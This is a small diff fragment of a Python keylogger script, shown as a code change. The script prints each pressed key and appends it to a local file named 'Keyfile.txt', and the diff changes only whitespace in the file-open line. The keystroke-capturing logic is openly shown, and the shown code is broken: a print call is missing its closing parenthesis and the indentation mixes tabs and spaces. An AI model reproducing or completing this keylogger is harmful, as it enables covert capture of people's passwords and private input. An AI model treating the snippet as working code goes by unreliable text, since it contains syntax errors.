@@ -8,7 +8,7 @@ def keyPressed(key):
     # Print which key was pressed (converting it into a string)
     print(str(key)
     # Open file Keyfile.txt as append, which means that everytime a key is pressed, it will be added to the end of the file.
-    with open("Keyfile.txt", 'a') as logKey:
+    with open("Keyfile.txt",'a') as logKey:
 	# If a character key is pressed ("a", "1") the value will be the key as a string 
 	try:
 	     char = key.char
